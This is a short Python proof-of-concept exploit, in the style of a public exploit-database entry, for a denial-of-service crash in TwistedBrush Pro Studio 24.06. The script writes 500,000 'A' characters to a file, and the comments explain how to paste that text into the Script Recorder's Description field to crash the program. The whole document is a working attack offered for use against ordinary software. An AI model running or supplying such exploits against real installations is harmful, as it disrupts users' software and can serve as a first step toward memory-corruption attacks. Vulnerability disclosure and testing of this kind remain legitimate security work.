# -*- coding: utf-8 -*-
# Exploit Title: TwistedBrush Pro Studio 24.06 - 'Script Recorder' Denial of Service (PoC)
# Date: 13/05/2019
# Author: Alejandra Sánchez
# Vendor Homepage: http://www.pixarra.com
# Software Link http://www.pixarra.com/uploads/9/4/6/3/94635436/tbrusha.exe
# Version: 24.06
# Tested on: Windows 10

# Proof of Concept:
# 1.- Run the python script "TwistedBrush_recorder.py", it will create a new file "PoC.txt"
# 2.- Copy the text from the generated PoC.txt file to clipboard
# 3.- Open TwistedBrush Pro Studio
# 4.- Go to 'Record' > 'Script Recorder...' 
# 5.- Paste clipboard in the 'Description' field
# 6.- Click 'Brush' button
# 7.- Crashed

buffer = "\x41" * 500000
f = open ("PoC.txt", "w")
f.write(buffer)
f.close()